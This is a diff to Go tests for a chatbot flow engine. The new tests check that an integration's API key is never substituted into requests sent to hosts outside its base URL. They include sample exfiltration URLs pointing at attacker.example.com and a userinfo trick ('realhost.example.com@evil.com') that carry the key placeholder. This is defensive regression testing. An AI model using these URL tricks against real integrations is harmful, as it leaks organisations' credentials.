@@ -82,6 +82,96 @@ func TestResolveIntegrationSecrets_PlaceholderButIntegrationInactive_FailsClosed
 	assert.Error(t, err)
 }
 
+func TestResolveIntegrationSecrets_URLMismatch_FailsClosed(t *testing.T) {
+	app := newProcessorTestApp(t)
+	org := testutil.CreateTestOrganization(t, app.DB)
+	integ := models.XProcessIntegration{OrganizationID: org.ID, BaseURL: "https://api.atacadaodospisos.com.br", APIKey: "real-secret-key", IsActive: true}
+	require.NoError(t, integ.EncryptSecrets(app.Config.App.EncryptionKey))
+	require.NoError(t, app.DB.Create(&integ).Error)
+
+	// A flow author points the node at a server they control, but still
+	// puts the placeholder in a header hoping it gets substituted.
+	config := map[string]any{
+		"url":     "https://attacker.example.com/collect",
+		"headers": map[string]any{"x-api-key": "{{integrations.xprocess.api_key}}"},
+	}
+
+	_, err := app.ResolveIntegrationSecretsForTest(org.ID, config)
+	assert.Error(t, err, "a url that doesn't target the integration's base_url must never get the real key substituted")
+}
+
+func TestResolveIntegrationSecrets_URLUserinfoTrick_FailsClosed(t *testing.T) {
+	app := newProcessorTestApp(t)
+	org := testutil.CreateTestOrganization(t, app.DB)
+	integ := models.XProcessIntegration{OrganizationID: org.ID, BaseURL: "https://realhost.example.com", APIKey: "real-secret-key", IsActive: true}
+	require.NoError(t, integ.EncryptSecrets(app.Config.App.EncryptionKey))
+	require.NoError(t, app.DB.Create(&integ).Error)
+
+	// "https://realhost.example.com" is a naive-HasPrefix match for this url
+	// (the userinfo trick), even though the request actually goes to
+	// evil.com. Requiring the ".../" boundary must reject it.
+	config := map[string]any{
+		"url":     "https://realhost.example.com@evil.com/collect",
+		"headers": map[string]any{"x-api-key": "{{integrations.xprocess.api_key}}"},
+	}
+
+	_, err := app.ResolveIntegrationSecretsForTest(org.ID, config)
+	assert.Error(t, err, "userinfo-trick url must fail closed, not pass a naive HasPrefix check")
+}
+
+func TestExecChatAPICall_XProcessPlaceholderURLMismatch_RoutesNon2xx(t *testing.T) {
+	var attackerReceivedKey bool
+	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.Header.Get("x-api-key") == "real-secret-key" {
+			attackerReceivedKey = true
+		}
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer attacker.Close()
+
+	app, org, account, contact, session := newGraphTestFixtures(t)
+	integ := models.XProcessIntegration{OrganizationID: org.ID, BaseURL: "https://api.atacadaodospisos.com.br", APIKey: "real-secret-key", IsActive: true}
+	require.NoError(t, integ.EncryptSecrets(app.Config.App.EncryptionKey))
+	require.NoError(t, app.DB.Create(&integ).Error)
+
+	flow := &models.ChatbotFlow{
+		BaseModel:       models.BaseModel{ID: uuid.New()},
+		OrganizationID:  org.ID,
+		WhatsAppAccount: account.Name,
+		Name:            "xprocess-lookup-url-mismatch",
+		IsEnabled:       true,
+		Graph: models.JSONB{
+			"version":    2,
+			"entry_node": "api",
+			"nodes": []any{
+				// url points at a server NOT covered by the integration's
+				// base_url, but headers still carry the placeholder.
+				map[string]any{"id": "api", "type": "api_call", "label": "attacker-controlled", "config": map[string]any{
+					"url":     attacker.URL,
+					"method":  "POST",
+					"headers": map[string]any{"x-api-key": "{{integrations.xprocess.api_key}}"},
+				}},
+				map[string]any{"id": "end", "type": "end"},
+				map[string]any{"id": "fallback", "type": "end"},
+			},
+			"edges": []any{
+				map[string]any{"from": "api", "to": "end", "condition": "http:2xx"},
+				map[string]any{"from": "api", "to": "fallback", "condition": "http:non2xx"},
+			},
+		},
+	}
+	require.NoError(t, app.DB.Create(flow).Error)
+
+	require.NoError(t, app.runChatGraph(account, contact, session, flow, "start", "", nil))
+	require.NoError(t, app.DB.First(session, session.ID).Error)
+	assert.Equal(t, models.SessionStatusCompleted, session.Status)
+
+	path := chatGraphPath(t, session)
+	require.GreaterOrEqual(t, len(path), 2)
+	assert.Equal(t, "http:non2xx", path[0]["outcome"], "a url outside the integration's base_url must fail closed via http:non2xx")
+	assert.False(t, attackerReceivedKey, "the real key must never reach a server outside the integration's base_url")
+}
+
 func TestExecChatAPICall_UsesXProcessIntegration_EndToEnd(t *testing.T) {
 	var gotAuth string
 	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
@@ -92,7 +182,10 @@ func TestExecChatAPICall_UsesXProcessIntegration_EndToEnd(t *testing.T) {
 	defer srv.Close()
 
 	app, org, account, contact, session := newGraphTestFixtures(t)
-	integ := models.XProcessIntegration{OrganizationID: org.ID, BaseURL: "https://unused.example.com", APIKey: "real-secret-key", IsActive: true}
+	// BaseURL must match the node's url (Finding 1's fix): the placeholder
+	// is only substituted when the raw, pre-template url targets the
+	// integration's own base_url.
+	integ := models.XProcessIntegration{OrganizationID: org.ID, BaseURL: srv.URL, APIKey: "real-secret-key", IsActive: true}
 	require.NoError(t, integ.EncryptSecrets(app.Config.App.EncryptionKey))
 	require.NoError(t, app.DB.Create(&integ).Error)
 
@@ -107,7 +200,7 @@ func TestExecChatAPICall_UsesXProcessIntegration_EndToEnd(t *testing.T) {
 			"entry_node": "api",
 			"nodes": []any{
 				map[string]any{"id": "api", "type": "api_call", "label": "consultar pedido", "config": map[string]any{
-					"url":     srv.URL,
+					"url":     srv.URL + "/api/pedido",
 					"method":  "POST",
 					"headers": map[string]any{"x-api-key": "{{integrations.xprocess.api_key}}"},
 					"body":    `{"numero_pedido":"666","documento":"12345678900"}`,
